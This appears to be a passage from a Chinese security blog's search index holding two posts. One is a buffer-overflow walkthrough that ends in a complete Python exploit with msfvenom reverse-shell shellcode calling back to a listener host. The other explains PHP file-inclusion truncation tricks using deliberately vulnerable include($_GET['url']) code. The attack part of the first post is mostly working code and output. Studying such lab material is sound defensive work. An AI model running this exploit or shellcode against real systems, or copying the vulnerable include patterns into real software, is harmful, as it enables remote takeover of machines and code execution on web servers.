<h2 id="覆盖EIP"><a href="#覆盖EIP" class="headerlink" title="覆盖EIP"></a>覆盖EIP</h2><blockquote>
<p>让EIP重写为JMP ESP，以便把程序控制劫持到ESP处，从而能够运行我们的shellcode。</p>
</blockquote>
<p><strong>使用Metasploit的<code>nasm_shell</code>工具查询<code>JMP ESP</code>的十六进制值</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425193928055.png" alt="image-20210425193928055"></p>
<h3 id="寻找可利用的跳板"><a href="#寻找可利用的跳板" class="headerlink" title="寻找可利用的跳板"></a>寻找可利用的跳板</h3><p>在<code>Immunity Debugger</code>中使用<code>mona</code>脚本查找可以利用的指令跳板</p>
<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><pre><code>!mona modules    //找到SEH、ADLR等均为false的dll，作为指令跳板，此例中为essfunc.dll
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425194245019.png" alt="image-20210425194245019"></p>
<pre><code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll   // 找到essfunc.dll的JMP ESP指令位置，即地址[625011af]
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425194607940.png" alt="image-20210425194607940"></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><pre><code>!mona jmp -r esp   // 效果同上，直接找到essfunc.dll的JMP ESP指令地址，同样为[625011af]
</code></pre>
<p><strong>将shellcode中要准备覆盖EIP的位置修改为<code>&#39;\xaf\x11\x50\x62&#39;</code></strong></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2003</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"TRUN /:./"</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">'\xaf\x11\x50\x62'</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End...,Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>可以看到，这里ESP指向的是我们在EIP后面给的<code>1000个C</code>, 现在我们是要将C替换成我们希望运行的Shellcode。</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425195226645.png" alt="image-20210425195226645"></p>
<h2 id="查找坏字节"><a href="#查找坏字节" class="headerlink" title="查找坏字节"></a>查找坏字节</h2><p><strong>查找坏字符思路：</strong> 发送(<code>0x00</code>–<code>0xff</code>)256个字符，查找所有坏字符</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2003</span>
badchars <span class="token operator">=</span> <span class="token punctuation">(</span>
<span class="token string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span>
<span class="token string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span>
<span class="token string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span>
<span class="token string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span>
<span class="token string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>
<span class="token string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>
<span class="token string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span>
<span class="token string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span>
<span class="token string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span>
<span class="token string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span>
<span class="token string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span>
<span class="token string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span>
<span class="token string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span>
<span class="token string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span>
<span class="token string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span>
<span class="token string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"</span>
<span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"TRUN /:./"</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">'\xbb\x11\x50\x62'</span> <span class="token operator">+</span> badchars<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End...,Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>可以看到所有字节都正常显示，表示没有需要过滤的坏字节。说明除了”\x00”以外的字符都可使用。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425195735650.png" alt="image-20210425195735650"></p>
<h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p><strong>利用msf生成shellcode</strong></p>
<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.7.5.150 LPORT=1234 EXITFUNC=thread -f python -b "\x00\x0a\x0d" -a x86
# -b "\x00\x0a\x0d" 去掉坏字符 
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425195942267.png" alt="image-20210425195942267"></p>
<blockquote>
<p>exp如下：</p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2003</span>
buf <span class="token operator">=</span>  b<span class="token string">""</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xbd\xbd\x7a\xc7\xf1\xd9\xc3\xd9\x74\x24\xf4\x58\x2b"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xc9\xb1\x52\x31\x68\x12\x83\xc0\x04\x03\xd5\x74\x25"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x04\xd9\x61\x2b\xe7\x21\x72\x4c\x61\xc4\x43\x4c\x15"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x8d\xf4\x7c\x5d\xc3\xf8\xf7\x33\xf7\x8b\x7a\x9c\xf8"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x3c\x30\xfa\x37\xbc\x69\x3e\x56\x3e\x70\x13\xb8\x7f"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xbb\x66\xb9\xb8\xa6\x8b\xeb\x11\xac\x3e\x1b\x15\xf8"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x82\x90\x65\xec\x82\x45\x3d\x0f\xa2\xd8\x35\x56\x64"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xdb\x9a\xe2\x2d\xc3\xff\xcf\xe4\x78\xcb\xa4\xf6\xa8"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x05\x44\x54\x95\xa9\xb7\xa4\xd2\x0e\x28\xd3\x2a\x6d"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xd5\xe4\xe9\x0f\x01\x60\xe9\xa8\xc2\xd2\xd5\x49\x06"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x84\x9e\x46\xe3\xc2\xf8\x4a\xf2\x07\x73\x76\x7f\xa6"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x53\xfe\x3b\x8d\x77\x5a\x9f\xac\x2e\x06\x4e\xd0\x30"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xe9\x2f\x74\x3b\x04\x3b\x05\x66\x41\x88\x24\x98\x91"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x86\x3f\xeb\xa3\x09\x94\x63\x88\xc2\x32\x74\xef\xf8"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x83\xea\x0e\x03\xf4\x23\xd5\x57\xa4\x5b\xfc\xd7\x2f"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x9b\x01\x02\xff\xcb\xad\xfd\x40\xbb\x0d\xae\x28\xd1"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x81\x91\x49\xda\x4b\xba\xe0\x21\x1c\xcf\xf3\x2c\x50"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xa7\xf9\x2e\x79\x58\x77\xc8\x13\x88\xd1\x43\x8c\x31"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x78\x1f\x2d\xbd\x56\x5a\x6d\x35\x55\x9b\x20\xbe\x10"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x8f\xd5\x4e\x6f\xed\x70\x50\x45\x99\x1f\xc3\x02\x59"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x69\xf8\x9c\x0e\x3e\xce\xd4\xda\xd2\x69\x4f\xf8\x2e"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xef\xa8\xb8\xf4\xcc\x37\x41\x78\x68\x1c\x51\x44\x71"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x18\x05\x18\x24\xf6\xf3\xde\x9e\xb8\xad\x88\x4d\x13"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x39\x4c\xbe\xa4\x3f\x51\xeb\x52\xdf\xe0\x42\x23\xe0"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xcd\x02\xa3\x99\x33\xb3\x4c\x70\xf0\xd3\xae\x50\x0d"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x7c\x77\x31\xac\xe1\x88\xec\xf3\x1f\x0b\x04\x8c\xdb"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x13\x6d\x89\xa0\x93\x9e\xe3\xb9\x71\xa0\x50\xb9\x53"</span>

s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"TRUN /:./"</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">'\xbb\x11\x50\x62'</span> <span class="token operator">+</span> <span class="token string">'\x90'</span><span class="token operator">*</span><span class="token number">50</span>  <span class="token operator">+</span> buf<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>本地对4448端口进行监听</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425200201179.png" alt="image-20210425200201179"></p>
<blockquote>
<p>执行exp</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425200242872.png" alt="image-20210425200242872"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425200249961.png" alt="image-20210425200249961"></p>
<p> nc成功获得反弹shell，到此即成功得到交互shell。</p>
]]></content>
      <tags>
        <tag>复现</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞-文件包含截断</title>
    <url>/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/</url>
    <content><![CDATA[<h1 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h1><h2 id="利用-00截断"><a href="#利用-00截断" class="headerlink" title="利用%00截断"></a>利用<code>%00</code>截断</h2><p><code>%00</code>截断受限于<code>GPC</code>和<code>addslashes()</code>等函数。也就是说<strong>在开启GPC或者使用过滤函数过滤的情况下不能使用</strong>，在<strong>PHP 5.3</strong>之后的版本全面修复了文件名<code>%00</code>截断的问题。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505100907925.png" alt="image-20210505100907925"></p>
<blockquote>
<p>当url参数被过滤时</p>
<p><code>%00</code>被转义成了0<code>    </code>0两个单体字符，不再具有截断功能</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505101258523.png" alt="image-20210505101258523"></p>
<h2 id="利用-截断"><a href="#利用-截断" class="headerlink" title="利用./截断"></a>利用<code>./</code>截断</h2><p>利用多个<code>./</code>来截断，这种方式不受限于<code>GPC</code>，但是同样在PHP 5.3版本之后被修复。</p>
<blockquote>
<p>在windows下使用240个点(<code>.</code>)连接可以截断</p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505104813141.png" alt="image-20210505104813141"></p>
<blockquote>
<p>在windows下，<code>./</code>共240个能够截断。</p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'./'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505105544640.png" alt="image-20210505105544640"></p>
<blockquote>
<p>linux下需要2038个<code>./</code>组合才能截断。</p>
</blockquote>
<h2 id="利用-伪截断"><a href="#利用-伪截断" class="headerlink" title="利用?伪截断"></a>利用<code>?</code>伪截断</h2><p>远程包含时利用问号<code>?</code>来截断，不受GPC和PHP版本的影响，只要能够返回代码给包含函数，它就能执行。</p>
<p>在HTTP协议中，访问<code>http://remotehost/1.txt</code>和访问<code>httpL://remotehost/1.txt?.php</code>的返回结果是一样的，因为这时候WebServer把<code>?</code>之后的内容当作是请求参数，而<code>txt</code>不在WebServer里面解析，参数对访问<code>1.txt</code>返回的内容不影响，于是就实现了伪截断。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505110633801.png" alt="image-20210505110633801"></p>
]]></content>
      <tags>
        <tag>文件包含</tag>
        <tag>Web</tag>
      </tags>
  </entry>
</search>
